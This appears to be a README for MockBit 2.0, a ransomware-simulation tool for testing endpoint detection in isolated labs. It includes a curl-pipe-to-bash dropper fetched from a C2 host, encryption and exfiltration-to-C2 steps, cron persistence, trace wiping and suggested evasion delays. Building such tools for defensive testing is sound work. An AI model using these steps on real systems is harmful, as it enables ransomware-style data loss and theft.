# MockBit 2.0 – Safe Ransomware Simulation for EDR Validation

⚠️  READ FIRST  
MockBit is a CONTROLLED, REVERSIBLE lab tool.  
Use only in isolated VMs or air-gapped networks you own.  
NEVER run against production, shared, or third-party systems.

--------------------------------------------------------------------
1. What it does
--------------------------------------------------------------------
MockBit behaves like real ransomware (T1486) but keeps you in full control:

Stage        | Realism                        | Safety net
-------------|--------------------------------|--------------------------------
Delivery     | curl / wget payload            | No exploits, no priv-esc
Encryption   | AES-256-CBC via OpenSSL        | Key logged → 100 % decryptable
Exfiltration | File list + key fragment       | Only dummy data you created
Persistence  | Optional cron job              | One-liner removal included
Cleanup      | –                              | Built-in decryptor + uninstaller

--------------------------------------------------------------------
2. Quick start (5 min)
--------------------------------------------------------------------
Lab topology
    +-----------+      +---------------+
    | Attacker  |----->| Victim VM     |
    | (C2 host) |      | (SentinelOne) |
    +-----------+      +---------------+

One-command install (on attacker – AlmaLinux 8.10)
sudo dnf install -y git python3-pip openssl
git clone https://github.com/Deathcrusher/mockbit_2.0.git
cd mockbit_2.0
chmod +x setup.sh && sudo ./setup.sh

Example output
C2 ready: http://192.168.1.100:8080
Payload URL: http://192.168.1.100:8000/payload_downloader.sh
Test files: /tmp/test_victim (200 items)

Trigger on victim (non-root for max EDR sensitivity)
curl -s http://192.168.1.100:8000/payload_downloader.sh | bash
Watch SentinelOne pop alerts → decrypt when finished.

--------------------------------------------------------------------
3. File map
--------------------------------------------------------------------
mockbit_2.0/
├── setup.sh              # installer & test-file generator
├── c2_server.py          # Flask C2 (beacon, exfil, key log)
├── payload_downloader.sh # stage-0 dropper
├── ransomware_core.sh    # stage-1 encryptor
├── decryptor.sh          # stage-2 recovery
├── uninstall.sh          # removes cron / tmp data
└── README.md             # this file

--------------------------------------------------------------------
4. Manual usage (skip setup.sh if you like)
--------------------------------------------------------------------
Encrypt only
./ransomware_core.sh /target/dir http://c2:8080

Decrypt only
./decryptor.sh /target/dir "KEY" "IV"

Stop C2
pkill -f c2_server.py

Wipe traces
./uninstall.sh

--------------------------------------------------------------------
5. Customising
--------------------------------------------------------------------
Target dir        – edit TARGET_DIR in any *.sh
Cipher            – change openssl enc -aes-256-??? 
Evasion delays    – add sleep $((RANDOM%10))
Multi-thread      – xargs -P 8 -I {} …
C2 endpoint       – change C2_URL variable

--------------------------------------------------------------------
6. Troubleshooting
--------------------------------------------------------------------
Port 8080 blocked
sudo firewall-cmd --add-port=8080/tcp --permanent && sudo firewall-cmd --reload

No SentinelOne alert
Run as NON-root; enable “Deep Visibility” & “Ransomware” policy

Decrypt fails
Use KEY+IV from SAME run (check C2 /exfil endpoint or ransom note)

Python missing
sudo dnf install python3 python3-pip && pip3 install flask

--------------------------------------------------------------------
7. License & contribution
--------------------------------------------------------------------
MIT © 2025 Deathcrusher 
Pull-requests welcome: Windows port, extra TTPs, EDR bypass notes (educational)

--------------------------------------------------------------------
8. MITRE mapping
--------------------------------------------------------------------
T1566.002  Initial Access   – curl/wget payload
T1059.004  Execution        – Unix shell
T1053.003  Persistence      – cron job (optional)
T1041      Exfiltration     – HTTP POST to C2
T1486      Impact           – Data encrypted for impact
